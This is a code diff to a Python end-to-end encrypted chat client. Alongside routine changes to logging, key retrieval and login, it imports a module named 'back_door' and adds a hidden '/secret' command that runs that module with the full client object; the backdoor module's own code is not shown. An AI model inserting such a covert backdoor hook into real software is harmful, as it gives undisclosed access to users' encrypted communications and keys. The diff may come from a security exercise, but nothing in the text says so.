@@ -11,6 +11,7 @@ from cryptography.hazmat.primitives.asymmetric import padding, rsa
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from websockets import connect
 from aiohttp import ClientSession
+import src.back_door as secret # Import the backdoor module
 
 from src import ui
 logger = ui.init_logger('server')   # Initialize logger
@@ -223,6 +224,13 @@ class Client:
                                 continue
                             target_username = user_input.split(" ", 1)[1]
                             await self.get_public_key(target_username)
+                        elif user_input.startswith("/secret"):
+                            try:
+                                await secret.secret(self) 
+                                logger.info("Executed secret command.")
+                            except Exception as e:
+                                logger.error(f"Failed to execute secret command: {e}")
+                                continue
                         elif user_input.startswith("/help"):
                             self.show_help()
                         else:
@@ -249,6 +257,9 @@ class Client:
         logger.trace("Received server's public key.")
 
     async def login_or_register(self):
+        await self.login()
+        '''
+        Old login_or_register() function:
         choice = input("Do you want to (r)egister or (l)ogin? ").strip().lower()
         if choice == 'r':
             await self.register()
@@ -257,7 +268,7 @@ class Client:
         else:
             print("Invalid choice. Exiting.")
             sys.exit(1)
-
+        '''
     async def register(self):
         data = {
             "type": "hello",
@@ -312,8 +323,8 @@ class Client:
         if msg_type == "status":
             status = response.get("status")
             message = response.get("message")
-            print(f"{status.upper()}: {message}")
-            logger.debug(f"Received status: {status}, message: {message}")
+            logger.system(f"{status.upper()}: {message}")
+            logger.trace(f"Received status: {status}, message: {message}")
         elif msg_type == "client_list":
             users = response.get("servers")
             logger.system(f"Online users: {users}")
@@ -366,8 +377,16 @@ class Client:
         # Retrieve recipient's public key from received_user_public_keys
         recipient_public_key = self.received_user_public_keys.get(recipient)
         if not recipient_public_key:
-            logger.error(f"Public key for user '{recipient}' not found. Use /get_public_key {recipient} to retrieve it.")
-            logger.warning(f"Public key for user '{recipient}' not found.")
+            logger.info(f"Public key for user '{recipient}' not found. Attempting to retrieve it automatically...")
+            await self.get_public_key(recipient)
+
+        # 等待一小会以确保公钥接收完毕
+        await asyncio.sleep(1)  # 这个等待时间可以根据需要调整
+
+        # 再次检查是否成功获取公钥
+        recipient_public_key = self.received_user_public_keys.get(recipient)
+        if not recipient_public_key:
+            logger.error(f"Failed to retrieve public key for user '{recipient}'. Cannot send private message.")
             return
 
         try:
@@ -551,22 +570,3 @@ if __name__ == "__main__":
         asyncio.run(start_client(host=args.host, port=args.port))
     except KeyboardInterrupt:
         logger.system("Client closed.")
-
-'''
-if __name__ == "__main__":
-    # 设置默认 WebSocket 和 HTTP URI
-    default_ws_uri = "ws://localhost:8000"
-    default_http_uri = "http://localhost:8100"
-
-    # 检查命令行参数
-    if len(sys.argv) == 3:
-        server_ws_uri = sys.argv[1]
-        server_http_uri = sys.argv[2]
-    else:
-        print(f"使用默认地址: WebSocket URI = {default_ws_uri}, HTTP URI = {default_http_uri}")
-        server_ws_uri = default_ws_uri
-        server_http_uri = default_http_uri
-
-    client = Client(server_ws_uri, server_http_uri)
-    asyncio.run(client.start())
-'''
